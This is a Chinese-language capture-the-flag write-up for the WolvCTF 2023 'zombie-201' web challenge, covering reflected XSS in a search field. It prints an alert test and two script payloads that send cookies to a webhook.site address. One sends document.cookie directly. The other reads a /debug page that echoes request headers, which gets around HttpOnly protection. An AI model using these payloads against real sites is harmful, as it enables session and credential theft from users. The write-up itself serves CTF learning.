# WolvCTF(2023)-zombie-201 writeup

访问题目地址:

![web-3.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.1.png)

有两个输入框，先看下前端代码,只有两个接口信息：
![web-3.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.2.png)

貌似没啥东西，第一个输入框要求输入一个zombie节目，第二个是输入一个zombie节目url。

第一个框随便输入内容之后，回显内容如下，输入内容嵌入到页面里面了

![web-3.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.3.png)

试试xss注入,很好，没有过滤：

<script>alert(1)</script>

请求地址：`http://49.232.142.230:11589/zombie?show=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`

![web-3.8](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.8.png)

第二个框是输入一个url,随便输入之后，回显内容要求输入的url中host头要和题目地址一样，emm

![web-3.9](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.9.png)

试下101中的payload:

```
<script>fetch('https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c',{method:'POST',body:document.cookie})</script>
```

![web-4.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-4.1.png)

额。。没有回传cookie，推测应该是开启了httponly直接拦截了含有xss回弹cookie的请求，扫下接口看下，有个/debug接口：

![web-4.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-4.2.png)

访问下这个接口：

![web-4.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-4.3.png)

直接显示了请求头的信息，这里其实可以进行请求头xss注入。。。但是这个系列的题目中flag都在cookie中，可以利用这个页面，直接读取页面中的cookie信息回弹webhook.

```
<script>
fetch("http://49.232.142.230:11915/debug")
  .then(r => r.text())
  .then(t => fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?c="+t));
</script>
```

![web-4.5](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-4.5.png)

cookie 信息回弹：

![web-4.4](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-4.4.png)
